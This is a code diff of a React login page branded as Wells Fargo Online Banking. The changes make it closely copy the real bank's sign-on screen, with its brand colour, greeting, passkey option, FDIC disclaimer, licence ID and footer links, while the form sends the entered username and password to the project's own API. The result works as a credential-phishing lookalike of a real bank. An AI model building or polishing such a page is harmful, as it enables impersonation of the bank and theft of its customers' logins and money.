@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
@@ -12,24 +12,12 @@ import {
   FormControl,
   FormField,
   FormItem,
-  FormLabel,
   FormMessage,
 } from "@/components/ui/form";
 import { useToast } from "@/hooks/use-toast";
 import { apiRequest } from "@/lib/queryClient";
-import {
-  Shield,
-  Lock,
-  Eye,
-  EyeOff,
-  HelpCircle,
-  Phone,
-  MapPin,
-  ChevronRight,
-  Menu,
-  Search,
-  X,
-} from "lucide-react";
+import { X, Search, Key } from "lucide-react";
+import heroBg from "@/assets/images/hero-bg.jpg";
 
 const loginSchema = z.object({
   username: z.string().min(1, "Username is required"),
@@ -39,10 +27,24 @@ const loginSchema = z.object({
 
 type LoginFormData = z.infer<typeof loginSchema>;
 
+function getGreeting(): string {
+  const hour = new Date().getHours();
+  if (hour < 12) return "Good morning";
+  if (hour < 18) return "Good afternoon";
+  return "Good evening";
+}
+
 export default function LoginPage() {
   const [showPassword, setShowPassword] = useState(false);
-  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
+  const [greeting, setGreeting] = useState(getGreeting());
   const { toast } = useToast();
+
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setGreeting(getGreeting());
+    }, 60000);
+    return () => clearInterval(interval);
+  }, []);
 
   const form = useForm<LoginFormData>({
     resolver: zodResolver(loginSchema),
@@ -52,6 +54,8 @@ export default function LoginPage() {
       saveUsername: false,
     },
   });
+
+  const usernameValue = form.watch("username");
 
   const loginMutation = useMutation({
     mutationFn: async (data: LoginFormData) => {
@@ -80,483 +84,322 @@ export default function LoginPage() {
     loginMutation.mutate(data);
   };
 
+  const clearUsername = () => {
+    form.setValue("username", "");
+  };
+
   return (
-    <div className="min-h-screen flex flex-col bg-background">
-      {/* Top utility bar */}
-      <div className="bg-primary text-primary-foreground">
-        <div className="max-w-7xl mx-auto px-4 py-2 flex items-center justify-between text-sm">
-          <div className="flex items-center gap-4">
-            <a
-              href="#"
-              className="flex items-center gap-1 opacity-90 hover:opacity-100 transition-opacity"
-              data-testid="link-atm-locations"
-            >
-              <MapPin className="w-4 h-4" />
-              <span className="hidden sm:inline">ATMs/Locations</span>
-            </a>
-            <a
-              href="#"
-              className="flex items-center gap-1 opacity-90 hover:opacity-100 transition-opacity"
-              data-testid="link-contact"
-            >
-              <Phone className="w-4 h-4" />
-              <span className="hidden sm:inline">Contact Us</span>
-            </a>
-          </div>
-          <div className="flex items-center gap-4">
-            <a
-              href="#"
-              className="flex items-center gap-1 opacity-90 hover:opacity-100 transition-opacity"
-              data-testid="link-help"
-            >
-              <HelpCircle className="w-4 h-4" />
-              <span className="hidden sm:inline">Help</span>
-            </a>
-            <button
-              className="flex items-center gap-1 opacity-90 hover:opacity-100 transition-opacity"
-              data-testid="button-search"
-            >
-              <Search className="w-4 h-4" />
-              <span className="hidden sm:inline">Search</span>
-            </button>
-          </div>
-        </div>
-      </div>
-
-      {/* Main header */}
-      <header className="bg-card border-b border-border shadow-sm">
-        <div className="max-w-7xl mx-auto px-4 py-4">
+    <div className="min-h-screen flex flex-col">
+      {/* Red header bar */}
+      <header className="bg-[#d71e28] text-white">
+        <div className="max-w-7xl mx-auto px-4 py-2">
           <div className="flex items-center justify-between">
-            <div className="flex items-center gap-2">
-              <div
-                className="w-12 h-12 bg-primary rounded-md flex items-center justify-center"
-                data-testid="img-logo"
-              >
-                <Shield className="w-7 h-7 text-primary-foreground" />
-              </div>
-              <div className="flex flex-col">
-                <span className="text-xl font-bold text-foreground tracking-tight">
-                  Wells Fargo
-                </span>
-                <span className="text-xs text-muted-foreground">
-                  Online Banking
-                </span>
-              </div>
-            </div>
-
-            {/* Desktop navigation */}
-            <nav className="hidden lg:flex items-center gap-6">
-              {[
-                "Personal",
-                "Small Business",
-                "Commercial",
-                "Corporate",
-                "Investing",
-              ].map((item) => (
-                <a
-                  key={item}
-                  href="#"
-                  className="text-foreground font-medium hover:text-primary transition-colors"
-                  data-testid={`link-nav-${item.toLowerCase().replace(" ", "-")}`}
-                >
-                  {item}
-                </a>
-              ))}
-            </nav>
-
-            {/* Mobile menu button */}
-            <button
-              className="lg:hidden p-2"
-              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
-              data-testid="button-mobile-menu"
+            <span
+              className="text-lg font-bold tracking-wide"
+              data-testid="text-logo"
             >
-              {mobileMenuOpen ? (
-                <X className="w-6 h-6" />
-              ) : (
-                <Menu className="w-6 h-6" />
-              )}
-            </button>
-          </div>
+              WELLS FARGO
+            </span>
 
-          {/* Mobile navigation */}
-          {mobileMenuOpen && (
-            <nav className="lg:hidden mt-4 pb-4 border-t border-border pt-4 flex flex-col gap-3">
-              {[
-                "Personal",
-                "Small Business",
-                "Commercial",
-                "Corporate",
-                "Investing",
-              ].map((item) => (
-                <a
-                  key={item}
-                  href="#"
-                  className="text-foreground font-medium hover:text-primary transition-colors py-2"
-                  data-testid={`link-mobile-nav-${item.toLowerCase().replace(" ", "-")}`}
-                >
-                  {item}
-                </a>
-              ))}
+            <nav className="flex items-center gap-4 text-xs">
+              <a
+                href="#"
+                className="flex items-center gap-1 hover:underline"
+                data-testid="link-enroll"
+              >
+                <span className="hidden sm:inline">Enroll</span>
+              </a>
+              <a
+                href="#"
+                className="hover:underline hidden sm:inline"
+                data-testid="link-customer-service"
+              >
+                Customer Service
+              </a>
+              <a
+                href="#"
+                className="hover:underline hidden sm:inline"
+                data-testid="link-atm-locations"
+              >
+                ATMs/Locations
+              </a>
+              <a
+                href="#"
+                className="hover:underline hidden sm:inline"
+                data-testid="link-espanol"
+              >
+                Español
+              </a>
+              <div className="flex items-center gap-2">
+                <span className="text-xs border border-white/50 px-2 py-0.5 rounded hidden sm:inline">
+                  Search
+                </span>
+                <Search className="w-4 h-4" />
+              </div>
             </nav>
-          )}
+          </div>
         </div>
       </header>
 
-      {/* Main content */}
-      <main className="flex-1">
-        <div className="max-w-7xl mx-auto px-4 py-8 lg:py-12">
-          <div className="grid lg:grid-cols-2 gap-8 lg:gap-16 items-start">
-            {/* Sign On Card */}
-            <Card className="shadow-lg border-border" data-testid="card-login">
-              <CardContent className="p-6 lg:p-8">
-                <div className="flex items-center gap-3 mb-6">
-                  <div className="w-10 h-10 bg-primary/10 rounded-full flex items-center justify-center">
-                    <Lock className="w-5 h-5 text-primary" />
-                  </div>
-                  <h1
-                    className="text-2xl font-bold text-foreground"
-                    data-testid="text-login-title"
-                  >
-                    Sign On
-                  </h1>
-                </div>
+      {/* Main content with background */}
+      <main
+        className="flex-1 relative"
+        style={{
+          backgroundImage: `url(${heroBg})`,
+          backgroundSize: "cover",
+          backgroundPosition: "center bottom",
+        }}
+      >
+        <div className="max-w-md mx-auto px-4 py-8">
+          {/* Login Card */}
+          <Card
+            className="shadow-lg border-0 bg-white"
+            data-testid="card-login"
+          >
+            <CardContent className="p-6 sm:p-8">
+              <h1
+                className="text-2xl text-center text-gray-800 mb-6 font-normal"
+                data-testid="text-greeting"
+              >
+                {greeting}
+              </h1>
 
-                <Form {...form}>
-                  <form
-                    onSubmit={form.handleSubmit(onSubmit)}
-                    className="space-y-5"
-                  >
-                    <FormField
-                      control={form.control}
-                      name="username"
-                      render={({ field }) => (
-                        <FormItem>
-                          <FormLabel className="text-foreground font-medium">
-                            Username
-                          </FormLabel>
-                          <FormControl>
+              <Form {...form}>
+                <form
+                  onSubmit={form.handleSubmit(onSubmit)}
+                  className="space-y-4"
+                >
+                  <FormField
+                    control={form.control}
+                    name="username"
+                    render={({ field }) => (
+                      <FormItem>
+                        <FormControl>
+                          <div className="relative">
                             <Input
-                              placeholder="Enter your username"
-                              className="h-11"
+                              placeholder="Username"
+                              className="h-12 pr-10 border-gray-300 rounded-sm text-base"
                               data-testid="input-username"
                               {...field}
                             />
-                          </FormControl>
-                          <FormMessage />
-                        </FormItem>
-                      )}
-                    />
-
-                    <FormField
-                      control={form.control}
-                      name="password"
-                      render={({ field }) => (
-                        <FormItem>
-                          <FormLabel className="text-foreground font-medium">
-                            Password
-                          </FormLabel>
-                          <FormControl>
-                            <div className="relative">
-                              <Input
-                                type={showPassword ? "text" : "password"}
-                                placeholder="Enter your password"
-                                className="h-11 pr-10"
-                                data-testid="input-password"
-                                {...field}
-                              />
+                            {usernameValue && (
                               <button
                                 type="button"
-                                onClick={() => setShowPassword(!showPassword)}
-                                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
-                                data-testid="button-toggle-password"
+                                onClick={clearUsername}
+                                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
+                                data-testid="button-clear-username"
                               >
-                                {showPassword ? (
-                                  <EyeOff className="w-5 h-5" />
-                                ) : (
-                                  <Eye className="w-5 h-5" />
-                                )}
+                                <X className="w-5 h-5" />
                               </button>
-                            </div>
-                          </FormControl>
-                          <FormMessage />
-                        </FormItem>
-                      )}
-                    />
+                            )}
+                          </div>
+                        </FormControl>
+                        <FormMessage />
+                      </FormItem>
+                    )}
+                  />
 
-                    <FormField
-                      control={form.control}
-                      name="saveUsername"
-                      render={({ field }) => (
-                        <FormItem className="flex items-center gap-2">
+                  <FormField
+                    control={form.control}
+                    name="password"
+                    render={({ field }) => (
+                      <FormItem>
+                        <FormControl>
+                          <div className="relative">
+                            <Input
+                              type={showPassword ? "text" : "password"}
+                              placeholder="Password"
+                              className="h-12 pr-16 border-gray-300 rounded-sm text-base"
+                              data-testid="input-password"
+                              {...field}
+                            />
+                            <button
+                              type="button"
+                              onClick={() => setShowPassword(!showPassword)}
+                              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#d71e28] text-sm font-medium hover:underline"
+                              data-testid="button-toggle-password"
+                            >
+                              {showPassword ? "Hide" : "Show"}
+                            </button>
+                          </div>
+                        </FormControl>
+                        <FormMessage />
+                      </FormItem>
+                    )}
+                  />
+
+                  <FormField
+                    control={form.control}
+                    name="saveUsername"
+                    render={({ field }) => (
+                      <FormItem>
+                        <div className="flex items-start gap-2">
                           <FormControl>
                             <Checkbox
                               checked={field.value}
                               onCheckedChange={field.onChange}
+                              className="mt-0.5 border-gray-400 data-[state=checked]:bg-[#d71e28] data-[state=checked]:border-[#d71e28]"
                               data-testid="checkbox-save-username"
                             />
                           </FormControl>
-                          <FormLabel className="text-sm text-muted-foreground font-normal cursor-pointer !mt-0">
-                            Save Username
-                          </FormLabel>
-                        </FormItem>
-                      )}
-                    />
+                          <div className="text-sm">
+                            <label className="text-gray-800 font-medium cursor-pointer">
+                              Save username
+                            </label>
+                            <p className="text-gray-500 text-xs mt-0.5">
+                              To help keep your account secure, save your
+                              username only on devices that aren't used by other
+                              people.
+                            </p>
+                          </div>
+                        </div>
+                      </FormItem>
+                    )}
+                  />
 
+                  <div className="pt-2">
                     <Button
                       type="submit"
-                      className="w-full h-12 text-base font-semibold"
+                      className="w-full h-11 bg-gray-200 hover:bg-gray-300 text-gray-700 font-medium rounded-full border border-gray-300"
+                      variant="ghost"
                       disabled={loginMutation.isPending}
                       data-testid="button-sign-on"
                     >
-                      {loginMutation.isPending ? "Signing On..." : "Sign On"}
+                      {loginMutation.isPending ? "Signing on..." : "Sign on"}
                     </Button>
-                  </form>
-                </Form>
-
-                <div className="mt-6 pt-6 border-t border-border space-y-3">
-                  <a
-                    href="#"
-                    className="flex items-center text-primary hover:underline text-sm font-medium"
-                    data-testid="link-forgot-password"
-                  >
-                    <ChevronRight className="w-4 h-4" />
-                    Forgot Password?
-                  </a>
-                  <a
-                    href="#"
-                    className="flex items-center text-primary hover:underline text-sm font-medium"
-                    data-testid="link-forgot-username"
-                  >
-                    <ChevronRight className="w-4 h-4" />
-                    Forgot Username?
-                  </a>
-                </div>
-
-                <div className="mt-6 p-4 bg-muted rounded-md">
-                  <div className="flex items-start gap-3">
-                    <Shield className="w-5 h-5 text-primary mt-0.5 flex-shrink-0" />
-                    <div>
-                      <p
-                        className="text-sm font-medium text-foreground"
-                        data-testid="text-security-title"
-                      >
-                        Security Center
-                      </p>
-                      <p className="text-xs text-muted-foreground mt-1">
-                        Your security is our priority. Learn how we protect
-                        your accounts and what you can do to stay safe online.
-                      </p>
-                    </div>
                   </div>
-                </div>
-              </CardContent>
-            </Card>
 
-            {/* Right side content */}
-            <div className="space-y-6">
-              <div className="bg-gradient-to-br from-secondary/20 to-secondary/5 rounded-lg p-6 lg:p-8 border border-secondary/30">
-                <h2
-                  className="text-xl font-bold text-foreground mb-3"
-                  data-testid="text-enroll-title"
+                  <div className="flex items-center justify-center gap-2 text-gray-500 text-sm py-1">
+                    <span>or</span>
+                  </div>
+
+                  <Button
+                    type="button"
+                    variant="outline"
+                    className="w-full h-11 rounded-full border-gray-800 text-gray-800 font-medium"
+                    data-testid="button-passkey"
+                  >
+                    <Key className="w-4 h-4 mr-2" />
+                    Use a passkey
+                  </Button>
+
+                  <p className="text-xs text-gray-500 text-center pt-1">
+                    Don't have one? Create a passkey after signing on and skip
+                    the password next time.
+                  </p>
+                </form>
+              </Form>
+
+              <div className="mt-4 text-center">
+                <a
+                  href="#"
+                  className="text-[#d71e28] text-sm hover:underline inline-flex items-center gap-1"
+                  data-testid="link-forgot"
                 >
-                  New to Online Banking?
-                </h2>
-                <p className="text-muted-foreground mb-4">
-                  Enroll now to access your accounts anytime, anywhere. It only
-                  takes a few minutes.
-                </p>
-                <Button variant="outline" data-testid="button-enroll">
-                  Enroll Now
-                  <ChevronRight className="w-4 h-4 ml-1" />
-                </Button>
+                  <span className="text-lg">→</span>
+                  Forgot username or password?
+                </a>
               </div>
+            </CardContent>
+          </Card>
+        </div>
 
-              <Card className="border-border">
-                <CardContent className="p-6">
-                  <h3 className="font-semibold text-foreground mb-4" data-testid="text-quick-links">
-                    Quick Links
-                  </h3>
-                  <div className="space-y-3">
-                    {[
-                      "Open an Account",
-                      "Credit Card Offers",
-                      "Mortgage Rates",
-                      "Auto Loans",
-                      "Personal Loans",
-                    ].map((link) => (
-                      <a
-                        key={link}
-                        href="#"
-                        className="flex items-center text-primary hover:underline text-sm"
-                        data-testid={`link-quick-${link.toLowerCase().replace(/ /g, "-")}`}
-                      >
-                        <ChevronRight className="w-4 h-4" />
-                        {link}
-                      </a>
-                    ))}
-                  </div>
-                </CardContent>
-              </Card>
-
-              <Card className="border-border bg-primary/5">
-                <CardContent className="p-6">
-                  <div className="flex items-start gap-4">
-                    <Phone className="w-8 h-8 text-primary flex-shrink-0" />
-                    <div>
-                      <h3 className="font-semibold text-foreground mb-1" data-testid="text-need-help">
-                        Need Help?
-                      </h3>
-                      <p className="text-sm text-muted-foreground mb-2">
-                        Our support team is available 24/7
-                      </p>
-                      <p className="text-lg font-bold text-primary">
-                        1-800-555-BANK
-                      </p>
-                    </div>
-                  </div>
-                </CardContent>
-              </Card>
-            </div>
-          </div>
+        {/* Disclaimer Card */}
+        <div className="max-w-2xl mx-auto px-4 pb-8">
+          <Card className="shadow-md border-0 bg-white">
+            <CardContent className="p-5">
+              <h3
+                className="font-bold text-gray-800 text-sm mb-3"
+                data-testid="text-disclaimer-title"
+              >
+                Investment and Insurance Products are:
+              </h3>
+              <ul className="space-y-1 text-sm text-gray-700 list-disc list-inside">
+                <li>Not Insured by the FDIC or Any Federal Government Agency</li>
+                <li>
+                  Not a Deposit or Other Obligation of, or Guaranteed by, the
+                  Bank or Any Bank Affiliate
+                </li>
+                <li>
+                  Subject to Investment Risks, Including Possible Loss of the
+                  Principal Amount Invested
+                </li>
+              </ul>
+              <p className="text-xs text-gray-500 mt-4">
+                Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
+              </p>
+            </CardContent>
+          </Card>
         </div>
       </main>
 
       {/* Footer */}
-      <footer className="bg-card border-t border-border mt-auto">
-        <div className="max-w-7xl mx-auto px-4 py-8">
-          <div className="grid grid-cols-2 md:grid-cols-4 gap-6 mb-8">
-            <div>
-              <h4 className="font-semibold text-foreground mb-3 text-sm" data-testid="text-footer-products">
-                Products
-              </h4>
-              <ul className="space-y-2 text-sm text-muted-foreground">
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-checking">
-                    Checking
-                  </a>
-                </li>
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-savings">
-                    Savings
-                  </a>
-                </li>
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-credit-cards">
-                    Credit Cards
-                  </a>
-                </li>
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-loans">
-                    Loans
-                  </a>
-                </li>
-              </ul>
-            </div>
-            <div>
-              <h4 className="font-semibold text-foreground mb-3 text-sm" data-testid="text-footer-resources">
-                Resources
-              </h4>
-              <ul className="space-y-2 text-sm text-muted-foreground">
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-faqs">
-                    FAQs
-                  </a>
-                </li>
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-security-center">
-                    Security Center
-                  </a>
-                </li>
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-privacy-policy">
-                    Privacy Policy
-                  </a>
-                </li>
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-terms">
-                    Terms of Use
-                  </a>
-                </li>
-              </ul>
-            </div>
-            <div>
-              <h4 className="font-semibold text-foreground mb-3 text-sm" data-testid="text-footer-about">
-                About Us
-              </h4>
-              <ul className="space-y-2 text-sm text-muted-foreground">
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-company-info">
-                    Company Info
-                  </a>
-                </li>
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-careers">
-                    Careers
-                  </a>
-                </li>
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-investors">
-                    Investor Relations
-                  </a>
-                </li>
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-newsroom">
-                    Newsroom
-                  </a>
-                </li>
-              </ul>
-            </div>
-            <div>
-              <h4 className="font-semibold text-foreground mb-3 text-sm" data-testid="text-footer-contact">
-                Contact
-              </h4>
-              <ul className="space-y-2 text-sm text-muted-foreground">
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-customer-service">
-                    Customer Service
-                  </a>
-                </li>
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-find-branch">
-                    Find a Branch
-                  </a>
-                </li>
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-schedule">
-                    Schedule Appointment
-                  </a>
-                </li>
-                <li>
-                  <a href="#" className="hover:text-foreground" data-testid="link-footer-feedback">
-                    Feedback
-                  </a>
-                </li>
-              </ul>
-            </div>
+      <footer className="bg-white border-t border-gray-200 py-4">
+        <div className="max-w-7xl mx-auto px-4">
+          <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-xs text-gray-600 mb-3">
+            <a href="#" className="hover:underline" data-testid="link-about">
+              About Wells Fargo
+            </a>
+            <span className="text-gray-300">|</span>
+            <a
+              href="#"
+              className="hover:underline"
+              data-testid="link-online-access"
+            >
+              Online Access Agreement
+            </a>
+            <span className="text-gray-300">|</span>
+            <a href="#" className="hover:underline" data-testid="link-privacy">
+              Privacy, Cookies, Security & Legal
+            </a>
+            <span className="text-gray-300">|</span>
+            <a
+              href="#"
+              className="hover:underline"
+              data-testid="link-do-not-sell"
+            >
+              Do not sell or share my personal information
+            </a>
           </div>
-
-          <div className="pt-6 border-t border-border">
-            <div className="flex flex-col md:flex-row items-center justify-between gap-4 text-xs text-muted-foreground">
-              <p data-testid="text-copyright">
-                &copy; 2024 Wells Fargo. All rights reserved. Member FDIC. Equal
-                Housing Lender.
-              </p>
-              <div className="flex items-center gap-4">
-                <a href="#" className="hover:text-foreground" data-testid="link-accessibility">
-                  Accessibility
-                </a>
-                <a href="#" className="hover:text-foreground" data-testid="link-privacy">
-                  Privacy
-                </a>
-                <a href="#" className="hover:text-foreground" data-testid="link-security">
-                  Security
-                </a>
-                <a href="#" className="hover:text-foreground" data-testid="link-sitemap">
-                  Sitemap
-                </a>
-              </div>
-            </div>
+          <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-xs text-gray-600 mb-3">
+            <a
+              href="#"
+              className="hover:underline"
+              data-testid="link-notice-data"
+            >
+              Notice of Data Collection
+            </a>
+            <span className="text-gray-300">|</span>
+            <a
+              href="#"
+              className="hover:underline"
+              data-testid="link-report-fraud"
+            >
+              Report Email Fraud
+            </a>
+            <span className="text-gray-300">|</span>
+            <a
+              href="#"
+              className="hover:underline"
+              data-testid="link-security-center"
+            >
+              Security Center
+            </a>
+            <span className="text-gray-300">|</span>
+            <a href="#" className="hover:underline" data-testid="link-sitemap">
+              Sitemap
+            </a>
+            <span className="text-gray-300">|</span>
+            <a href="#" className="hover:underline" data-testid="link-feedback">
+              Give Us Feedback
+            </a>
           </div>
+          <p
+            className="text-xs text-gray-500 text-center"
+            data-testid="text-copyright"
+          >
+            © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801.
+          </p>
         </div>
       </footer>
     </div>
